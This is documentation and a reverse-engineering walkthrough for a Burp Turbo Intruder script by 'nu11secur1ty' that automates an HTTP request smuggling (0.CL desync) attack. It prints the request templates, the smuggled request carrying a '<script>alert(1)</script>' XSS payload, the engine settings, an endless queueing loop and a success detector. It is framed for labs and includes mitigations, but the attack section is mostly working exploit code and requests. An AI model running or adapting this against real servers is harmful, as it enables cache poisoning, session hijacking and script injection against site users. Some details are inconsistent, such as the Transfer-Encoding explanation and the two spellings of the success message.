# Burp POST Body Smuggling Intruder Script – Documentation

**Author:** nu11secur1ty  
**Year:** 2025  
**Purpose:** Automate detection and exploitation of HTTP request smuggling vulnerabilities via Burp Intruder.

---

## Table of Contents

1. Introduction  
2. Requirements  
3. Setup  
4. Script Overview  
5. Technical Details  
6. Usage Instructions  
7. Payload Construction  
8. Attack Flow  
9. Response Handling  
10. Stop Condition  
11. Security Considerations  
12. References  
13. Full Python Script  

---

## 1. Introduction

This script leverages **HTTP request smuggling** vulnerabilities to deliver a crafted payload through Burp Suite Intruder. It automates sending specially crafted HTTP requests with **Content-Length manipulations** to detect server desynchronization issues.  

Unlike previous versions, **the script does not automatically stop** after the payload executes. The operator must manually terminate the attack after confirming success.

---

⚙️ Technical Analysis

The core of the attack leverages the Transfer-Encoding and Content-Length headers:
Transfer-Encoding: Specifies how the body of the request is encoded. The chunked transfer encoding allows the body to be sent in chunks, with each chunk preceded by its size.
Content-Length: Indicates the size of the request body in bytes.
When both headers are present, different servers may interpret them differently. For instance, a front-end proxy might prioritize Content-Length, while a back-end server might prioritize Transfer-Encoding. This discrepancy can lead to the back-end server receiving a request that the front-end server has already processed, allowing the attacker to smuggle additional requests .
In the provided script, the kurnabiva1 request is designed to be processed by the front-end server, while kurnabiva2 and smuggled are intended for the back-end server. The victim request helps determine if the payload has been executed.


🛡️ Security Implications

Exploiting HRS vulnerabilities can have severe consequences:
Bypassing Security Controls: Attackers can bypass firewalls, proxies, and other security mechanisms.
Cross-Site Scripting (XSS): Malicious scripts can be injected into responses, leading to XSS attacks.
Session Hijacking: Attackers can steal session cookies or tokens, impersonating legitimate users.
Cache Poisoning: Malicious responses can be cached and served to other users.

🛠️ Mitigation Strategies

To protect against HRS attacks:
Consistent Header Parsing: Ensure that both front-end and back-end servers interpret Content-Length and Transfer-Encoding headers consistently.
Disable Connection Reuse: Prevent reusing connections between front-end and back-end servers to avoid desynchronization.
Use HTTP/2: HTTP/2 has improved handling of request parsing, reducing the likelihood of HRS vulnerabilities.
Implement Web Application Firewalls (WAFs): Configure WAFs to detect and block malicious request patterns.
Regular Security Audits: Conduct regular security assessments to identify and remediate potential vulnerabilities.

🧪 Conclusion

The provided Burp Suite Intruder script is a sophisticated tool for automating the exploitation of HTTP request smuggling vulnerabilities. 
By understanding its components and the underlying attack vectors, security professionals can better defend against such threats. 
Regular updates to security practices and tools are essential to stay ahead of emerging vulnerabilities and attack techniques.

## 2. Requirements

- Burp Suite Professional with Intruder module  
- Python 3.x for script execution  
- Network access to the target host  
- Knowledge of HTTP request smuggling techniques  

---

## 3. Setup

1. Place `0.CL-request-smuggling-XSS.py` in Burp Suite Extender scripts directory.  
2. Configure Intruder to use this script as the payload engine.  
3. Define the `host` variable dynamically using Burp’s target scope.  

---

## 4. Script Overview

- **Global Flag:** `stop_attack` – included but **does not auto-stop** the attack.  
- **Functions:**  
  - `queueRequests(target, wordlists)` – sends the crafted requests.  
  - `handleResponse(req, interesting)` – monitors responses but only logs payload execution.  

---

## 5. Technical Details

The attack consists of three stages:

1. **kurnabiva1** – Initial POST request to a target endpoint with adjustable `Content-Length`.  
2. **kurnabiva2** – GET requests injected with a payload to trigger XSS or other desync vulnerabilities.  
   - `kurnabiva2_chopped` – preliminary request fragment.  
   - `kurnabiva2_revealed` – final part combined with the smuggled request.  
3. **victim** – Standard GET request to detect if the payload executed.  

---

## 6. Usage Instructions

1. Start Burp Suite and target the host you want to test.  
2. Load the script into Intruder’s `Payload Processing` section.  
3. Execute the attack.  
4. Monitor console output for `[+] Donne, your exploit is finished!` – indicates payload execution.  
5. **Manually stop Intruder** once success is confirmed.  

---

## 7. Payload Construction

- **Smuggled Request:**  

```http
GET /post?postId=7 HTTP/1.1
User-Agent: yu5md"><script>alert(1)</script>hgpov
user-agent: yu5md"><script>alert(1)</script>hgpov
X: Y
```


- Encodes an XSS payload in both HTTP/1.1 and HTTP/2 headers.
- Integrated into kurnabiva2_revealed for desync exploitation.

8. Attack Flow

queueRequests:

```
Send kurnabiva1 with manipulated Content-Length
Send kurnabiva2 (chopped + revealed + smuggled)
Send victim request to detect execution
Repeat until operator stops Intruder manually
```


9. Response Handling

- Each response is added to the global table.
- The script logs when the payload executes by detecting the marker hgpov in victim responses.
- Does not stop automatically – operator must manually halt Intruder

10. Stop Condition

```python
if req.label == 'victim' and 'hgpov' in req.response:
    print("[+] Done, your exploit is finished!")
```


- Logs payload execution to console.
- Manual intervention required to stop attack.


11. Security Considerations

- Use only on authorized targets or in lab environments.
- HTTP request smuggling can have unintended consequences on production systems.
- Payloads may trigger XSS or other vulnerabilities; handle outputs safely.


12. References

- PortSwigger Research: [HTTP/1 Must Die](https://portswigger.net/research/http1-must-die)
- 0.CL Lab examples and learning materials


13. Full Python Script by @nu11secur1ty

---------------------------------------------------------------------------------------------------------------------------------

# Reverse Engineering the “Turbo” Burp Intruder Script

## 0) What this script is for (in one line)
It automates a **0-CL / request-smuggling** attack by desynchronizing the front-end and back-end, smuggling a crafted request (with an XSS marker), and then probing with a “victim” request to observe success.

---

## 1) Global state

```python
stop_attack = False
```

- **Purpose:** Legacy flag used in earlier variants to stop the loop when a success marker appears. In the “manual-stop” version, this flag is not used to break the loop; it’s just left in place and harmless.
- **Impact:** No functional effect unless the loop checks it (the manual-stop version does not).

---

## 2) Entry point: `queueRequests(target, wordlists)`

This is called by Burp’s Intruder engine at attack start.

### 2.1 Request engine configuration

```python
engine = RequestEngine(
    endpoint=target.endpoint,
    concurrentConnections=10,
    requestsPerConnection=1,
    engine=Engine.BURP,
    maxRetriesPerRequest=0,
    timeout=15
)
```

- **endpoint:** Comes from Intruder’s target. All requests go there.
- **concurrentConnections=10:** Up to 10 TCP connections to increase race/desync chances.
- **requestsPerConnection=1:** Keeps each connection “fresh” (helps with precise queueing/ordering).
- **Engine.BURP:** Use Burp’s own HTTP stack.
- **maxRetriesPerRequest=0:** Don’t retry (retries can destroy timing for desync).
- **timeout=15:** Per-request timeout.

**Why:** Timing and connection reuse control are critical in desync attacks; these choices reduce variance and keep behavior predictable.

---

## 3) Request templates

The script defines multiple “building block” requests:

### 3.1 `kurnabiva1` (initial POST)

```http
POST /resources/images/avatarDefault.svg HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: %s
```

- Contains a `%s` placeholder that will be replaced by Intruder with a number.
- Crafted to look like a normal POST but with manipulated `Content-Length`.
- **Purpose:** This sets up the front-end/back-end desynchronization (classic 0-CL technique).

### 3.2 `smuggled` (payload)

```http
GET /post?postId=10 HTTP/1.1
User-Agent: yu5md"><script>alert(1)</script>hgpov
user-agent: yu5md"><script>alert(1)</script>hgpov
X: Y
```

- Deliberately malformed/duplicated headers.
- Carries the XSS payload (`<script>alert(1)</script>`) with marker `hgpov`.
- **Purpose:** This is the injected “ghost request” that rides inside the desync.

### 3.3 `kurnabiva2_chopped`

```http
GET / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 123
X: Y
```

- Fragment request to confuse the back-end parsing state.

### 3.4 `kurnabiva2_revealed`

```http
GET /404 HTTP/1.1
Host: {host}
User-Agent: foo
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
```

- Completes the chopped request.
- When combined with `smuggled`, it desynchronizes back-end’s view vs front-end’s view.

### 3.5 `victim`

```http
GET / HTTP/1.1
Host: {host}
User-Agent: foo
```

- Simple request used as probe.
- If the smuggled payload took effect, response here will reflect it.

---

## 4) Queueing logic

```python
while True:
    engine.queue(kurnabiva1, len(kurnabiva2_chopped), label='kurnabiva1', fixContentLength=False)
    engine.queue(kurnabiva2_chopped + kurnabiva2_revealed + smuggled, label='kurnabiva2')
    engine.queue(victim, label='victim')
```

- **Infinite loop**: Will run until the operator manually stops Intruder.
- Queues three types of requests in strict order:
  1. Desync setup (`kurnabiva1`)
  2. Desync trigger + smuggled payload (`kurnabiva2`)
  3. Probing request (`victim`)

---

## 5) Response handler

```python
def handleResponse(req, interesting):
    table.add(req)
    if req.label == 'victim' and 'hgpov' in req.response:
        print("[+] Donne, your exploit is finished!")
```

- Every response is logged in the Intruder table.
- For “victim” responses, script scans for marker `hgpov`.
- If found: prints success message.

**Note:** In this “manual-stop” version, the attack does not automatically halt; it simply prints confirmation. The operator must stop Intruder.

---

## 6) Attack logic flow

1. Send malformed POST with Content-Length mismatch.  
2. Immediately send crafted GET fragments + smuggled payload.  
3. Immediately send a “victim” probe.  
4. If back-end is desynced: smuggled payload will be executed and response will contain marker.  
5. Script prints success line.  
6. Operator manually stops Intruder.  

---

## 7) Key insights from reverse engineering

- **Minimalist but effective**: Only three request types.  
- **Reusable**: Can be adapted to different payloads.  
- **Operator-driven stop**: Puts analyst in control instead of auto-halting.  
- **Demonstration-oriented**: Its real purpose is educational / CTF-lab exploitation rather than stealth red-team work.  

---

## 8) Security implications

- Designed for **authorized security testing only**.  
- Demonstrates how subtle HTTP parsing quirks can lead to request smuggling and stored/ reflected XSS.  
- Highlights importance of aligning front-end/back-end parsers.  

---

## 9) Conclusion

This script is a hands-on educational tool for **HTTP request smuggling** research and CTFs. Its three-level structure (setup, smuggle, probe) is a distilled blueprint of desync exploitation.  
Reverse engineering confirms it is not malware; rather, it is a specialized exploitation aid for penetration testers.  
